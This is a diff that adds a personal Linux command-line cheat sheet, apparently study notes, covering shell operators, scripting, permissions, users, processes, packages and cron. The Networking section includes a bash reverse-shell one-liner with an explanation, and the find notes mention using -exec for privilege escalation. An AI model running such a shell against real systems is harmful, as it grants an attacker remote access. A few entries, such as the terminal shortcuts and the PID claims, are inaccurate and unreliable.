@@ -1,0 +1,387 @@
+Considerations:
+
+* Remember that everything in Linux is a file and the output of one command can become the input of another using a pipe. Files and folders that start with "." are hidden files.
+All files in a linux filesystem stem from the root directory, / (just a slash).
+
+* A file descriptor is an integer number that uniquely represents an opened file for a process. The OS maintains two file descriptor tables, one is per-process and the other system-wide.
+In UNIX systems sockets are also indices into the same table as files (Windows is different). 
+On a Unix-like operating system, the first three file descriptors, by default, are STDIN (standard input), STDOUT (standard output), and STDERR (standard error).
+
+* Use * to expand it to anything (including empty) when a name is needed. e.g.: rm -rf * | ./expl*
+
+* As in any computer program, remember to use the arrow keys, start/end, and prev/next page to move around.
+
+* In bash (or similar modern TTYs) use tab for command autocompletion (press twice to disambiguate), ctrl-r to search command history, and the up/down arrow keys to insert recent commands.
+
+* Use ctrl-c to discard the command you are typing (also useful to interrupt programs).
+
+* Sometimes you need to surround text or paths between quotes, you can combine simple and double quotes to make one of the quotes part of the text.
+
+* Some characters have special meanings, so they are reserved, you can escape them using back slack (\). One example is $, as it's used to access the value of 
+defined variables (btw, you can define variables with var=value).
+
+* You can use the output of one command as a parameter of another executing the command like this $(<command>). e.g.: sudo openvpn $(ls | grep TryHackMe)
+
+* Edit ~/.bashrc to add commands to execute at bash startup, e.g.:
+export PATH=$PATH:/my/dir
+myprogram
+
+* When you are in a terminal you can copy and paste with ctrl-shift-c and ctrl-shift-v.
+
+* You can append a command with '2>/dev/null' to redirect errors to '/dev/null' (null device, a special file where input is discarded) and have a cleaner output.
+Here 2 is the file descriptor associated to stderr (standard error).
+
+* You can set environment variables before executing a command with: VAR=<value> command <parameters>
+
+* The system call is the fundamental interface between an application and the Linux kernel (type 'man syscalls' for more info)
+
+
+Chaining operators:
+
+Chaining of Linux commands means, combining several commands and make them execute based upon the behaviour of the operator used in between them. 
+It's important to note that, unlike many other languages, the short-circuiting booleans (&& and ||) have the same precedence, they also associate to the left.
+
+1. Ampersand Operator (&):
+The function of ‘&‘ is to make the command run in background. Just type the command followed with a white space and ‘&‘. You can execute more than one command in the background, in a single go. e.g.: apt-get update & apt-get upgrade & (these commands run simultaneously)
+
+2. semi-colon Operator (;):
+The semi-colon operator makes it possible to run, several commands in a single go and the execution of command occurs sequentially. e.g.: apt-get update ; apt-get upgrade ;
+
+3. AND Operator (&&):
+The AND Operator (&&) would execute the second command only, if the execution of first command SUCCEEDS, i.e., the exit status of the first command is 0. This command is very useful in checking the execution status of last command. e.g.: ping -c3 www.tecmint.com && links www.tecmint.com (visit the website only if the host is live)
+
+4. OR Operator (||):
+The OR Operator (||) is much like an ‘else‘ statement in programming. The above operator allow you to execute second command only if the execution of first command fails, i.e., the exit status of first command is ‘1‘.
+
+5. NOT Operator (!):
+The NOT Operator (!) is much like an ‘except‘ statement. This command will execute all except the condition provided. e.g.: rm -r !(*.html) (delete all the files except ‘html‘ files)
+
+6. PIPE Operator (|):
+
+This PIPE operator is very useful where the output of first command acts as an input to the second command. For example, pipeline the output of ‘ls -l‘ to ‘less‘ and see the output of the command. e.g.: ls -l | less
+
+7. Command Combination Operator {}:
+Combine two or more commands, the second command depends upon the execution of the first command. For example, check if a directory ‘bin‘ is available or not, and output corresponding output with: [ -d bin ] || { echo Directory does not exist, creating directory now.; mkdir bin; } && echo Directory exists.
+
+8. Precedence Operator ():
+The Operator makes it possible to execute command in precedence order. e.g.: (Command_x1 &&Command_x2) || (Command_x3 && Command_x4)
+
+9. Concatenation Operator (\): 
+The Concatenation Operator (\) as the name specifies, is used to concatenate large commands over several lines in the shell. e.g.: vim text\(1\).txt
+
+10. Redirection Operators (<, >, >>): 
+These operators are used to redirect the output of a command or a group of commands to a stream or file. They can be used to redirect either standard input or standard output or both. Almost all commands accept input with redirection operators.
+Use > to redirect the output of a command, e.g., echo 'Hi there' > hi.txt (creates a file)
+You can also redirect and append to the end of the file using >>.
+You can use < to use a file as input of a program, e.g., program < input.txt
+
+
+Scripts:
+
+A Bash script is a plain text file which contains a series of commands. 
+Anything you can run normally on the command line can be put into a script and it will do exactly the same thing. 
+Similarly, anything you can put into a script can also be run normally on the command line and it will do exactly the same thing.
+The default behavior of a Bash script is that the current working directory in the script is that of the shell from which you run it.
+You can change the current working directory to always be the directory that the script is located in by adding: cd "$(dirname "$0")".
+When we run a normal command (such as ls) we just type its name but when running a script we put a ./ in front of it. 
+The variable PATH holds a list of folders for which you can execute their binaries by typing their names. You can see its value with echo $PATH.
+Bash only looks in those specific directories and doesn't consider sub directories or your current directory. 
+It will look through those directories in order and execute the first instance of the program or script that it finds. 
+The $PATH variable is an individual user variable so each user on a system may set it to suit themselves.
+It allows us to have several different versions of a program installed. We can control which one gets executed based on where it sits in our $PATH.
+You could also use it wrap other programs.
+
+The Shebang (#!):
+#!/bin/bash should be the first line of any bash script. The hash exclamation mark ( #! ) character sequence is referred to as the Shebang. Following it is the path to the interpreter (or program) that should be used to run (or interpret) the rest of the lines in the text file. (For Bash scripts it will be the path to Bash, but there are many other types of scripts and they each have their own interpreter.) The shebang must be on the very first line of the file (line 2 won't do, even if the first line is blank). There must also be no spaces before the # or between the ! and the path to the interpreter.
+Whilst you could use a relative path for the interpreter, most of the time you are going to want to use an absolute path. You will probably be running the same scripts from a variety of locations.
+It is possible to leave out the line with the shebang and still run the script but it is unwise. If you are at a terminal and running the Bash shell and you execute a script without a shebang then Bash will assume it is a Bash script. So this will only work assuming the user running the script is running it in a Bash shell and there are a variety of reasons why this may not be the case, which is dangerous.
+
+
+Terminal control sequences:
+Commands sent to the terminal that input a specific non-printable ASCII character to perform an associated action.
+
+ctrl-c: interrupts the running program
+ctrl-d: sends an EOF (end of file) to close the terminal
+ctrl-z: suspends the running program
+ctrl-s: freezes the screen, stopping the display
+ctrl-q: thaws out the screen and allows the screen display to continue
+ctrl-h: deletes the last character typed
+ctrl-w: deletes the last word typed
+ctrl-u: deletes the last line typed
+ctrl-r: retrieves previously run commands so you can run them again
+ctrl-u: removes text from the command line and places it in the clipboard
+ctrl-y: grabs text from the clipboard and runs it
+ctrl-l: clears the screen
+ctrl-a: moves cursor to the beginning of the line
+ctrl-e: moves cursor to the end of the line
+
+
+General commands:
+
+A majority of commands allow for arguments to be provided. These arguments are identified by a hyphen and a certain keyword known as flags or switches.
+Commands usually have a --help option. This option will list the possible options that the command accepts, provide a brief description and example of how to use it.
+This option is, in fact, a formatted output of what is called the man page (short for manual), which contains documentation for Linux commands and applications.
+To access this documentation, we can use the man command and then provide the command we want to read the documentation for. e.g.: man ls
+
+Clear screen:                     clear
+Show manual page of <name>:       man [<page>] <name>
+Search for commands:              apropos <keyword>
+Print text:                       echo <text>
+Environment variables:            env
+Shutdown the machine:             shutdown (0 | now: right away, -r: reboot)
+See ASCII codes:                  man ascii
+See exit code of prev command:    echo $? ('?' is a var that holds it)
+
+Show current location:            pwd
+List directory contents:          ls -la <location = .> (-l: as list, -a: show hidden files, -h: human-readable sizes)
+Shortcut for ls -la:              ll
+Show file content:                cat <file>
+Redirect input to file & stdout:  tee <file> (e.g.: ls -la | tee listing.txt)
+Change directory:                 cd <directory> (.: current dir, ..: parent dir)
+Create new empty file:            touch <file>
+Make new directory:               mkdir <dir_name>
+Copy file:                        cp <source> <destination> (-R: copy folder) 
+Move file:                        mv <source> <destination>
+Remove file:                      rm <file> (-r: delete dirs, -f: never prompt)
+File type and information:        file <filepath>
+Find files:                       find -name / *.txt (find all txt files in the root directory)
+Locate file:                      locate <name | relative path>
+Check file types or existence:    [  ([ -d bin ] to check if a dir called bin exists in the current folder) 
+Find patterns in text:            grep <pattern>
+Page through text:                less <file> (when inside less use: h: help, q: quit, /key: find key, n (N): next(prev) result
+Count lines/bytes/chars in file:  wc -l <file> (count lines)
+Locate command binary:            whereis <command>
+Sort file contents:               sort <file>
+
+Show current user id:             id
+Show current user name:           whoami
+Become another user:              su <user> (don't specify a user to become superuser; add -l to inherit more properties of the new user, like env vars)
+Change file privileges:           chmod <file> (chmod +x: execution, chmod 777: all privileges), you can't chmod FAT32 filesystems, move the executable
+Execute command as root:          sudo <command>
+
+System information:               uname -a
+Processes information:            ps [aux] (add 'aux' to see the processes run by other users and the system; add axjf to view process tree)
+Real-time processes info:         top (stats are updated every 10 secs or when you use the arrow keys)
+Kill a process:                   kill <pid> (we can send signals to the process to be killed: SIGTERM to allow cleanup (default), SIGKILL to avoid cleanup, SIGSTOP to stop a process)
+
+Block devices:                    lsblk
+
+Decompress tar file:              tar -xvzf <file>
+Decompress zip file:              unzip <file>
+Decompress gzip files (gz):       gzip -d <file>
+Compress into zip file:           zip -r <output> <input> (-e: encrypt)
+
+Find differences between files:   diff <file1> <file2>
+Check file checksum:              echo "<hash> <filename>" | {md5sum | sha1sum | sha256sum | sha512sum} -c -
+Print file checksum:              <*>sum <file> (* = {md5|sha1|...})
+
+
+Misc:
+
+Run VLC from CLI:                 cvlc --play-and-exit audio.mp3 
+Decrypt PDF:                      qpdf --password=<pass> --decrypt <input> <output>
+Translator (Translate Shell):     trans [-b|-brief] [source=en]:[target=en] [word | phrase] (langs use a two-letter code, read them all with trans -R)
+
+
+Networking:
+
+Test host reachability:           ping <host> (either domain or IP address)
+Web browser:                      links2 <url>
+Connect to a VPN:                 sudo openvpn <vpn_key_file>
+SSH into a machine:               ssh <user>@<ip> (you'll be prompted for a pass; add '<command> >> <local_file>' to send output to local file)
+Connect to ProtonVPN:             protonvpn-cli
+Get private IPs:                  ip a | grep 'inet '
+Get public IP:                    curl -L ipinfo.io/ip
+Show active network interfaces:   ifconfig
+Show accesible networks:          netstat -rn
+Download file from server:        wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
+Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
+
+Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
+
+The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
+
+
+Finding files: 
+Some flags: find [<location>] [-perm { |-|/}<permissions>] [-type {d|f}] [-name <pattern>] [-user <user>] [-size {-| |+}<size>{c|k|M|G}]
+e.g.: find ~ -name *config* -type f -perm -g=r,o=r -size -2M --> Files in the current user's home, with a name that includes 'config', where the file owner's group and others can read, and the file size is less than 2 MB.
+Notes: 
+- About perm: (empty) = exact permissions, - = at least those permissions, and / = either permission bit (at least one of the groups)
+- About type: d = dir and f = file
+- About size: - = less than, + = more than, and (empty) = exactly that size
+- You can use either the format <who>=<permission> or <who>+<permission>. e.g.: u+r | u=r
+- You can also use iname instead of name to make it case insensitive
+- You should always enclose your name pattern in quotes
+- Time-related searches may be useful. The flag consists of a word and a prefix. The words are min and time, for minutes and days, respectively. The prefixes are a, m, and c, and are used to specify when a file was last accessed, modified, or had its status changed. As for the numerical values, the same rules of the -size flag apply, except there is no suffix. To put it all together: in order to specify that a file was last accessed more than 30 minutes ago, the option -amin +30 is used. To specify that it was modified less than 7 days ago, the option -mtime -7 is used. (Note: when you want to specify that a file was modified within the last 24 hours, the option -mtime 0 is used.)
+- You can suppress the output of any possible errors to make the output more readable. This is done by appending 2> /dev/null to your command. This way, you won’t see any results you’re not allowed to access.
+- You can use the -exe flag in your find command to execute a new command. e.g.: -exec whoami \;. It can be used for privilege escalation.
+- There are optional powerful flags like: -delete, -ls, or -exec, to apply to each file found
+- Use -prune to exclude directories, you must specify them after the search dir and before any other option like this: find <search_dir> \( -path "/dir1" -o -path "./dir2" -o -path "/dir3" \) ! -prune -o -name "<pattern>" 2>/dev/null
+Note: you can remove the group operation, i.e. (\ (\, if you want to exclude only one dir. For more info read stackoverflow.com/a/63523300)
+
+
+Virtual machines networking configurations:
+- Host-only: only permits network operations with the Host OS (and other VMs connected to the same host-only network).
+- NAT: will mask all network activity as if it came from your Host OS (as a router does), the VM will be assigned in a separate subnet.
+- Bridged: replicates another node on the physical network and your VM will receive it's own IP address if DHCP is enabled in the network.
+
+
+Understanding ls command output:
+
+The columns of the output in the long listing format are from left to right: file type and permissions, link count, owner, group, file size, last modified date, and file name.
+
+Unix file systems keep track of a "link count" to all objects in the file system. This "link count" value is the number of different directory entries that all point to the inode associated with the object. In the case of a regular file, the link count is the number of hard links to that file. However, Unix file systems don't let you create hard links to directories, yet the link count on a directory is always at least two. Why is this so? There are pointers from parent directories to child directories, and viceversa (the ".." link). And every dir contains the "." link that points back to itself.
+If a kernel-level rootkit would be used to hide a directory, the link count would betray this discrepancy. It's very easy to write a tool to detect hidden dirs. This is part of the chkrootkit tool (checks for signs of rootkits).
+
+
+Symbolic links (Linux shortcuts):
+A symlink (also called a symbolic link) is a type of file in Linux that points to another file or a folder on your computer. Symlinks are similar to shortcuts in Windows.
+In Linux systems, the data structure that does the actual storing of information is called an Inode. A hard link is a file all its own, and the file references or points to the exact spot on a hard drive where the Inode stores the data. A soft link isn't a separate file, it points to the name of the original file, rather than to a spot on the hard drive.
+ln is the link command. By default, ln creates hard links, add the -s flag to make it soft.
+Create symlink: ln -s /path/to/file /path/to/symlink
+Delete symlink: unlink /path/to/symlink | rm /path/to/symlink                  
+Find broken symlinks: find . -xtype l
+
+
+Users, groups and permissions:
+
+User (u): the owner of the file (person who created the file).
+Group (g): the group can contain multiple users. Therefore, all users in that group will have the same permissions. It makes things easier than assign permission for every user you want.
+Other (o): any person has access to that file, that person has neither created the file, nor are they in any group which has access to that file.
+
+The permissions of a file are shown when you ls (list) a directory in the first column of the output, it looks like -rwxr--r--.
+The first character is the file type, it can be - (regular file) or d (directory). Then each block of three belongs to the user, group and other respectively.
+The 3 characters in each block are r (read), w (write), x (execute) and - (when the corresponding permission is absent). 
+
+Permissions are changed using the chmod command. e.g.: chmod <mode> <file>   
+
+Permission are represented by 'modes' which can be either a symbolic representation of changes to make, or an octal number representing the bit pattern for the new mode bits.
+
+- Symbolic representation: WhoWhatWhich == {u|g|o|a}{+|-|=}{r|w|x|s|t|S|T} where u,g,o,a == user,group,other,all and +,-,= == add,remove,set exact
+e.g.: chmod o+w file.txt (add write permission for other users to 'file.txt')
+
+- Octal representation: <user_perm><group_perm><other_perm> where each permission is an octal digit (0-7):
+0 = no permission, 1 = execute, 2 = write, 3 = execute and write, 4 = read, 5 = read and execute, 6 = read and write, 7 = read, write, and execute. 
+e.g.: chmod 774 file.txt (the user and its group have every permission but others only can read)
+
+Special permissions (each of them replace the execute permission in user, group and other as listed below respectively):
+You can add them with their symbol (as a capital letter if execute permission is not set) or with a fourth bit prepended in octal. 
+- SUID (4 | s): execute a file as its owner
+- SGID (2 | s): if set on a file, execute as the group owner, and if set on a dir, files created in that dir will have their group ownership set to that of the group owner
+- Sticky (1 | t): only affects dirs, it restricts file deletion, only the owner of a file or root can remove it (e.g.: /tmp or /var/spool/cron/crontabs)
+
+Create user (a group with the same name will be created by default):
+1. sudo useradd -m -s /bin/bash <user> (-m: create a user dir inside /home; -s: login shell) 
+2. sudo adduser <user> (this does the same as the previous command)
+Afterwards, you need to set a password with: sudo passwd <user>
+Note: you can issue 'cat /etc/passwd' to verify the new user has been created
+
+Delete user:
+1. sudo userdel <user>, then you must delete the user directory
+2. sudo deluser --remove-home <user> (also deletes the user dir)
+
+A group is a collection of users (a user can belong to multiple groups). The primary purpose of the groups is to define a set of privileges like read, write, or execute permission for a given resource that can be shared among the users within the group. You can see all the groups with: cat /etc/group
+Create group:              sudo groupadd <group>
+Add user to a group:       sudo usermod -aG <group> <user>
+Delete user from a group:  sudo gpasswd -d <user> <group>
+Delete group:              sudo groupdel <group>
+Change pass:               passwd <user>
+Change user:               su [-] <user> (if - is added before the user, then the env is changed to the user's)
+
+The /etc/passwd contains one entry per line for each user (user account) of the system. This file shuld be world-readable as many utilities use it to map user IDs to user names. All fields are separated by a colon (:) symbol. There are 7 fields:
+
+1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
+2. Password: An x character indicates that encrypted password is stored in /etc/shadow file.
+3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
+4. Group ID (GID): The primary group ID (stored in /etc/group file).
+5. User ID Info (GECOS): The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field is used by finger command.
+6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exist then user's directory becomes '/'.
+7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.
+
+
+Create bootable Linux USB drive:
+1. Unmount USB partition:         sudo umount /dev/sd<?><?> 
+2. Copy content from ISO:         sudo dd bs=4M if=/path/to/input.iso of=/dev/sd<?> conv=fdatasync status=progress
+
+
+Free up space:
+
+1. Empty trash folder: rm -rf ~/.local/share/Trash/*
+2. Get rid of packages that are no longer required: sudo apt-get autoremove
+3. Uninstall unnecessary applications: sudo apt-get remove <package-name>
+4. Clean up APT cache: sudo apt-get autoclean (outdated packages) or sudo apt-get clean (complete apt cache), ('sudo du -sh /var/cache/apt' to see cache size)
+5. Clear systemd journal logs older than 3 days: sudo journalctl --vacuum-time=3d ('journalctl --disk-usage' to check log size)
+6. Clean the thumbnail cache: rm -rf ~/.cache/*  ('du -sh ~/.cache' to see cache size)
+
+
+Processes:
+
+Processes are the programs that are running on your machine. They are managed by the kernel, where each process will have an ID associated with it, also known as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60. Use the ps command to show the active processes.
+The Operating System (OS) uses namespaces to ultimately split up the resources available on the computer to (such as CPU, RAM and priority) processes.
+Namespaces are great for security as it is a way of isolating processes from another -- only those that are in the same namespace will be able to see each other.
+
+init (short for initialization) is the first process started during booting of the computer system. Init is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes. Init is started by the kernel during the booting process; a kernel panic will occur if the kernel is unable to start it. Init is typically assigned process identifier 1. It provides a way of managing a user's processes and sits in between the operating system and the user. 
+systemd is the standard system and service manager in modern Linux. Any program or piece of software that we want to start will start as what's known as a child process of systemd. 
+The command systemctl allows us to interact with the systemd process/daemon with the format: systemctl [option] [service]. Some options include: stop, start, restart, reload, and status.
+Compatible programs will provide service unit files used by systemd to manage the program's execution.
+
+You can configure systemd to run programs automatically during Linux startup following these steps:
+1. Check if service unit for your program exists with: systemctl list-unit-files --type=service | grep [service]
+You'll have to create your own service unit if it's a custom program or if your program doesn't come with one during installation.
+2. Enable service unit that you want to execute during startup with: systemctl enable [service_unit] 
+3. Check if service unit is enabled to confirm with: systemctl is-enabled [service_unit]
+
+
+Jobs:
+
+A job is a process that the shell manages. Each job is assigned a sequential job ID. Because a job is a process, each job has an associated PID. There are three types of job statuses:
+1. Foreground: When you enter a command in a terminal window, the command occupies that terminal window until it completes. This is a foreground job.
+2. Background: When you enter an ampersand (&) symbol at the end of a command line, the command runs without occupying the terminal window. The shell prompt is displayed immediately after you press Return. This is an example of a background job.
+3. Stopped: If you press Control + Z for a foreground job, or enter the stop command for a background job, the job stops. This job is called a stopped job.
+
+Job control commands:
+* jobs	   Lists all jobs
+* bg %n    Places the current or specified job in the background, where n is the job ID
+* fg %n	   Brings the current or specified job into the foreground, where n is the job ID
+* Control-Z  Stops the foreground job and places it in the background as a stopped job
+
+Pressing Ctrl+Z sends the TSTP signal to your process. This halts execution (the kernel won't schedule any more CPU time to the process) and the process is awaiting a CONT to continue processing. You can emulate/replicate this via kill -TSTP and kill -CONT (since kill will send a nominated signal to your process, despite the name!).
+The shell has the functionality to 'background' the process, but this is a relationship between the shell and the process. The process itself doesn't really have the concept of 'background' or 'foreground'.
+
+
+Packet management:
+
+A package manager is a tool that allows users to install, remove, upgrade, configure and manage software packages on an operating system. The package manager can be a graphical application like a software center like Discover or a command line tool like apt or pacman.
+Dpkg is a base package management system for the Debian Linux family (which includes Ubuntu, Linux Mint, Kali Linux and Parrot OS), it is used to install, remove, store and provide information about .deb packages. It is a low-level tool and there are front-end tools that help users to obtain packages from remote repositories and/or handle complex package relations and these include: APT (Advanced Packaging Tool), Aptitude Package Manager, and Synaptic Package Manager.
+Many packages use dependencies. Dependencies are additional packages required by the principal package in order to function properly. Over time you may hoard lots of unnecessary packages that were once a dependecy of other packages. Use 'sudo apt autoremove' to take care of them.
+
+Whilst Operating System vendors will maintain their own repositories of packages, additional repositories can be added.
+You may need to download a GPG key and use apt-key to trust the new source with: wget -q -O - <gpg_key_url> | sudo apt-key add - 
+You may also found key IDs from a particular keyserver, to add them use: sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys <key_ID> (Ubuntu is just a common example)
+
+Some methods to add repos in Debian-based distros:
+1. Using command line: sudo add-apt-repository ppa:Software_name/ppa (add-apt-repository --remove ppa:PPA_Name/ppa to remove them)
+2. Editing /etc/apt/sources.list and adding manually the new entry
+3. Creating a file like new_repo.list in /etc/apt/sources.list.d and entering the repository information
+
+Consider using snap, a command that manages snaps, packages that work across many different Linux distributions.
+
+Common commands in apt:
+* Install package:    sudo apt install <package>
+* Remove package:     sudo apt remove <package>
+* Update package db:  sudo apt update
+* Upgrade packages:   sudo apt upgrade
+
+
+Automation:
+
+Users may want to schedule a certain action or task to take place after the system has booted. Take, for example, running commands, backing up files, or launching your favourite programs.
+Crontab is one of the processes that is started during boot, which is responsible for facilitating and managing cron jobs.
+A crontab is simply a special file with formatting that is recognised by the cron process to execute each line step-by-step.
+Crontabs can be edited by using crontab -e. Use cron job generators as https://crontab.guru to make it easier.
+
+
+Logs:
+Located in the /var/log directory, these files and folders contain logging information for applications and services running on your system.
+These services and logs are a great way in monitoring the health of your system and protecting it. Not only that, but the logs for services such as a web server contain information about every single request - allowing developers or administrators to diagnose performance issues or investigate an intruder's activity.
+
